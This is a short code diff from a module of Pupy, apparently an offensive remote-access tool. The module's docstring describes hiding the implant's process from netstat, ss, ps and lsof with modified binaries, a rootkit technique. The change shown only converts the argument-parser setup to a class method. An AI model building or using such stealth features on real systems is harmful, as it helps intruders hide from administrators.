@@ -12,10 +12,13 @@ class SetStealth(PupyModule):
     """Hides the running process from netstat, ss, ps, lsof by using modified binaries.
 Credits to: http://www.jakoblell.com/blog/2014/05/07/hacking-contest-rootkit/
 Demo: https://vimeo.com/157356150"""
+
     dependencies=["linux_stealth"]
-    def init_argparse(self):
-        self.arg_parser = PupyArgumentParser(prog="Linux Stealth Module", description=self.__doc__)
-        self.arg_parser.add_argument('--port', default=None, help='The port number to which Pupy is connecting to.')
+
+    @classmethod
+    def init_argparse(cls):
+        cls.arg_parser = PupyArgumentParser(prog="Linux Stealth Module", description=cls.__doc__)
+        cls.arg_parser.add_argument('--port', default=None, help='The port number to which Pupy is connecting to.')
 
     def run(self, args):
         with redirected_stdio(self):
